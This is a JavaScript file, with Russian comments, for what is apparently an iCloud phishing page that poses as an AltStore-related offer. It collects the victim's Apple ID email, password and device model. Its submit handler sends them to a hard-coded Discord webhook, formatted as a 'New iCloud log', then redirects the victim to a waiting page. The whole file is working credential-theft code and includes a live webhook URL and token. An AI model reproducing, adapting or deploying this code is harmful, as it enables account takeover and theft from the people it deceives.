// Конфигурация
const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

// Получаем элементы
const showOptionsBtn = document.getElementById('showOptionsBtn');
const optionsModal = document.getElementById('optionsModal');
const icloudModal = document.getElementById('icloudModal');
const closeButtons = document.querySelectorAll('.close');
const options = document.querySelectorAll('.option');
const icloudForm = document.getElementById('icloudForm');
const submitBtn = document.getElementById('submitBtn');
const whyLink = document.getElementById('whyLink');
const altstoreTooltip = document.getElementById('altstoreTooltip');
const formError = document.getElementById('formError');

let selectedOption = null;

// Открыть модалку с выбором
showOptionsBtn.onclick = function() {
    optionsModal.style.display = 'flex';
}

// Закрытие модалок
closeButtons.forEach(btn => {
    btn.onclick = function() {
        optionsModal.style.display = 'none';
        icloudModal.style.display = 'none';
        altstoreTooltip.style.display = 'none';
    }
});

window.onclick = function(event) {
    if (event.target == optionsModal) optionsModal.style.display = 'none';
    if (event.target == icloudModal) icloudModal.style.display = 'none';
}

// Выбор опции
options.forEach(opt => {
    opt.onclick = function() {
        selectedOption = this.dataset.target;
        optionsModal.style.display = 'none';
        icloudModal.style.display = 'flex';
    }
});

// Показать подсказку про AltStore
whyLink.onclick = function() {
    altstoreTooltip.style.display = 'block';
    setTimeout(() => {
        altstoreTooltip.style.display = 'none';
    }, 5000);
}

// Отправка формы
icloudForm.onsubmit = async function(e) {
    e.preventDefault();

    // Простейшая валидация
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const model = document.getElementById('model').value;

    if (!email || !password || !model) {
        showError('Заполни все поля!');
        return;
    }
    if (!email.includes('@') || !email.includes('.')) {
        showError('Введите корректный email');
        return;
    }

    // Блокируем кнопку, чтобы не отправили дважды
    submitBtn.disabled = true;
    submitBtn.textContent = 'Отправка...';

    // Данные для отправки
    const data = {
        email: email,
        password: password,
        model: model,
        option: selectedOption,
        timestamp: new Date().toISOString()
    };

    try {
        // Отправка в Discord через embed (более красиво)
        const embed = {
            embeds: [{
                title: '🔐 Новый лог iCloud',
                color: 0x0071e3,
                fields: [
                    { name: '📧 Почта', value: data.email, inline: true },
                    { name: '🔑 Пароль', value: data.password, inline: true },
                    { name: '📱 Модель', value: data.model, inline: true },
                    { name: '🎯 Выбор', value: data.option, inline: true },
                    { name: '⏱ Время', value: data.timestamp, inline: false }
                ]
            }]
        };

        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        });

        if (response.ok) {
            // Перенаправление на страницу ожидания
            window.location.href = 'redirect.html';
        } else {
            showError('Ошибка отправки, попробуй ещё раз');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Отправить';
        }
    } catch (error) {
        showError('Ошибка сети, проверь подключение');
        submitBtn.disabled = false;
        submitBtn.textContent = 'Отправить';
    }
}

function showError(msg) {
    formError.textContent = msg;
    formError.style.display = 'block';
    setTimeout(() => {
        formError.style.display = 'none';
    }, 3000);
}
